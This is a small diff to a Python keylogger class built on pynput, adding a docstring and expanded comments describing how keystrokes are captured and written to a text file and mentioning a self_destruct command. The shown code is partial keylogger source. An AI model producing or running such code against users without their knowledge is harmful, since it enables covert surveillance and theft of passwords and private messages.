@@ -1,8 +1,9 @@
 from pynput.keyboard import Listener
 
+"""This KeyLogger class contains functions that start the logger, write key strokes to a text file, and stops itself upon a self_destruct command"""
 class KeyLogger:
 
-    #log a keypress
+    #logs a keypress by writing the key to a file. Certain keystrokes must be validated to be stored such as a backspace, enter, shift, space, caps_lock, etc.
     def on_press(key):
         k = str(key)
         k = k.replace("'", " ")
@@ -17,7 +18,7 @@ class KeyLogger:
         file.write('\n')
         file.close()
 
-    #start logging keys
+    #starts a listener for keystrokes and calls the on_press function each time to logging keys
     def start(self):
         with Listener(on_press=KeyLogger.on_press) as self.listener:
             self.listener.join()
